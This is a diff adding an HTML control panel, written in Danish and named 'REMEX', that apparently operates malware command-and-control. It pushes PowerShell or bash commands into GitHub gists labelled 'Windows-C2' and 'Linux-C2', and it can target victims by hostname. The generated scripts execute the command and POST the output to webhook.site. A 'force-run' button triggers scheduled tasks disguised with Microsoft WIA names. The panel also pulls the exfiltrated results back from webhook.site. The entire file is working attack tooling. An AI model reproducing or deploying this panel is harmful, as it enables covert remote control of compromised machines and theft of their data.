@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html lang="da">
+<head>
+<meta charset="UTF-8">
+<title>REMEX Kontrolpanel</title>
+<style>
+  body{font-family:Segoe UI,Arial;background:#0d1117;color:#c9d1d9;margin:0;padding:20px}
+  .box{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:16px;margin-bottom:16px}
+  h1{font-size:20px;color:#58a6ff}h2{font-size:15px;color:#79c0ff;margin-top:0}
+  label{display:block;font-size:12px;color:#8b949e;margin-bottom:4px}
+  input,textarea,select{width:100%;background:#0d1117;color:#c9d1d9;border:1px solid #30363d;border-radius:6px;padding:8px;font-family:Consolas,monospace;font-size:13px;box-sizing:border-box}
+  textarea{min-height:120px;resize:vertical}
+  button{background:#238636;color:#fff;border:none;border-radius:6px;padding:10px 18px;font-size:14px;cursor:pointer;margin:8px 4px 0 0}
+  button.gray{background:#30363d}button:hover{filter:brightness(1.2)}
+  #log{background:#0d1117;border:1px solid #30363d;border-radius:6px;padding:8px;font-family:Consolas;font-size:12px;max-height:200px;overflow-y:auto;white-space:pre-wrap}
+  .status-ok{color:#3fb950}.status-err{color:#f85149}
+  .row{display:flex;gap:12px}.col{flex:1}
+</style>
+</head>
+<body>
+<h1>REMEX Kontrolpanel</h1>
+
+<div class="box">
+  <h2>Konfiguration (udfyldes forste gang)</h2>
+  <label>GitHub Token (github_pat_...)</label>
+  <input id="pat" type="password" placeholder="github_pat_...">
+  <label>Webhook UUID (fx 1a2b3c4d-5678-90ab-cdef-1234567890ab)</label>
+  <input id="wht" placeholder="c59daa67-5edb-42c2-a5a9-e87102af74cc">
+  <button class="gray" onclick="saveCfg()">Gem lokalt</button>
+</div>
+
+<div class="box">
+  <h2>Send kommando</h2>
+  <div class="row">
+    <div class="col">
+      <label>Maal</label>
+      <select id="target">
+        <option value="e8f5ee9851640143a68b847fbbc658ab">Windows-C2 (REMEX v25.3.4)</option>
+        <option value="7c325b35f32012657336258774ba19dd">Linux-C2 (REMEX-L)</option>
+      </select>
+    </div>
+    <div class="col">
+      <label>Kun bestemt maskine (valgfrit hostname-filter)</label>
+      <input id="host" placeholder="fx PC-5CG3233LFB / MGT-PC / tomt = alle">
+    </div>
+  </div>
+  <label>Kommando (PowerShell til Windows, bash til Linux)</label>
+  <textarea id="cmd"></textarea>
+  <button onclick="sendCmd()">SEND KOMMANDO</button>
+  <button class="gray" onclick="standby()">Saet i standby</button>
+  <button class="gray" onclick="forceWin()">Force-run Windows tasks</button>
+</div>
+
+<div class="box">
+  <h2>Webhook-beskeder (seneste 20)</h2>
+  <button class="gray" onclick="loadWebhook()">Opdater</button>
+  <label>Auto-opdater hvert 30s</label><input type="checkbox" id="auto" onchange="toggleAuto()">
+  <div id="log">Tryk "Opdater" for at hente...</div>
+</div>
+
+<div class="box">
+  <h2>Log</h2>
+  <div id="stat"></div>
+</div>
+
+<script>
+var WINGIST = "e8f5ee9851640143a68b847fbbc658ab";
+var seq = 0;
+
+function tok() { return document.getElementById("pat").value; }
+
+function log(s, ok) {
+  var d = document.getElementById("stat");
+  var cls = ok ? "status-ok" : "status-err";
+  d.innerHTML = d.innerHTML + "<div class='" + cls + "'>" + new Date().toLocaleTimeString() + " - " + s + "</div>";
+}
+
+function saveCfg() {
+  localStorage.setItem("remexui", JSON.stringify({ pat: document.getElementById("pat").value, wht: document.getElementById("wht").value }));
+  log("Konfiguration gemt i browser OK", 1);
+}
+
+function gh(method, url, body) {
+  return fetch(url, {
+    method: method,
+    headers: { "Authorization": "Bearer " + tok(), "Accept": "application/vnd.github+json", "Content-Type": "application/json" },
+    body: body ? JSON.stringify(body) : null
+  }).then(function (r) {
+    return r.text().then(function (txt) {
+      if (!r.ok) { throw new Error("GitHub " + r.status + ": " + txt.slice(0, 200)); }
+      return txt ? JSON.parse(txt) : {};
+    });
+  });
+}
+
+function setGist(id, content) {
+  return gh("GET", "https://api.github.com/gists/" + id, null).then(function (g) {
+    var fname = Object.keys(g.files)[0];
+    var payload = { files: {} };
+    payload.files[fname] = { content: content };
+    return gh("PATCH", "https://api.github.com/gists/" + id, payload);
+  });
+}
+
+function sendCmd() {
+  var t = document.getElementById("target").value;
+  var c = document.getElementById("cmd").value.trim();
+  var h = document.getElementById("host").value.trim();
+  if (!c) { log("Ingen kommando angivet", 0); return; }
+  seq = seq + 1;
+  var stamp = new Date().getTime();
+
+  if (t === WINGIST) {
+    var win = "# REMEX v25 cmd ui" + seq + " " + stamp + "\n";
+    if (h !== "") {
+      win = win + "if($env:COMPUTERNAME -notlike '" + h + "*'){ return }\n";
+    }
+    win = win + "$r = @()\n";
+    win = win + "try { $r = (" + c + ") 2>&1 | Out-String } catch { $r = 'FEJL: ' + $_.Exception.Message }\n";
+    win = win + "try{Invoke-RestMethod -Uri 'https://webhook.site/bing' -Method Post -Body ($env:COMPUTERNAME + ': ' + $r) -TimeoutSec 15}catch{}\n";
+    setGist(t, win).then(
+      function () { log("Sendt til Windows-gist OK", 1); },
+      function (e) { log("FEJL: " + e.message, 0); }
+    );
+  } else {
+    var lin = "# REMEX-L ui" + seq + " " + stamp + "\n";
+    if (h !== "") {
+      lin = lin + '[ "$(hostname)" != "' + h + '" ] && exit 0\n';
+    }
+    lin = lin + "outp=\"REMOTE-L KOERET paa $(hostname): $(( " + c + " ) 2>&1 | head -c 300)\"\n";
+    lin = lin + "curl -sf -m 10 -X POST -d \"$outp\" https://webhook.site/bing >/dev/null\n";
+    setGist(t, lin).then(
+      function () { log("Sendt til Linux-gist OK", 1); },
+      function (e) { log("FEJL: " + e.message, 0); }
+    );
+  }
+  document.getElementById("cmd").value = "";
+}
+
+function standby() {
+  var t = document.getElementById("target").value;
+  setGist(t, "# REMEX idle\n").then(
+    function () { log("Standby sat OK", 1); },
+    function (e) { log("FEJL: " + e.message, 0); }
+  );
+}
+
+function forceWin() {
+  var c = "# REMEX force " + new Date().getTime() + "\n";
+  c = c + 'Start-ScheduledTask -TaskPath "\\Microsoft\\Windows\\WIA\\" -TaskName "WiaDiagnostics" -ErrorAction SilentlyContinue\n';
+  c = c + 'Start-ScheduledTask -TaskPath "\\Microsoft\\Windows\\WIA\\" -TaskName "WiaMaint" -ErrorAction SilentlyContinue\n';
+  c = c + '"tasks kicked"';
+  setGist(WINGIST, c).then(
+    function () { log("Force-run sendt til Windows OK", 1); },
+    function (e) { log("FEJL: " + e.message, 0); }
+  );
+}
+
+function loadWebhook() {
+  var u = document.getElementById("wht").value.trim();
+  if (!u) { log("Manglende webhook UUID", 0); return; }
+  fetch("https://webhook.site/token/" + u + "/requests?page=1&per_page=20")
+    .then(function (r) { return r.json(); })
+    .then(function (d) {
+      var el = document.getElementById("log");
+      var html = "";
+      (d.data || []).forEach(function (req) {
+        html = html + "<div>" + String(req.created_at || "").replace("T", " ") + " | " + String(req.content || "").slice(0, 400) + "</div><hr>";
+      });
+      el.innerHTML = html;
+      log("Webhook hentet OK (" + (d.data || []).length + " beskeder)", 1);
+    })
+    .catch(function (e) { log("Webhook-fejl: " + e.message, 0); });
+}
+
+function toggleAuto() {
+  if (document.getElementById("auto").checked) {
+    window._ai = setInterval(loadWebhook, 30000);
+  } else {
+    clearInterval(window._ai);
+  }
+}
+
+(function () {
+  try {
+    var c = JSON.parse(localStorage.getItem("remexui") || "{}");
+    if (c.pat) { document.getElementById("pat").value = c.pat; }
+    if (c.wht) { document.getElementById("wht").value = c.wht; }
+  } catch (e) {}
+})();
+</script>
+</body>
+</html>
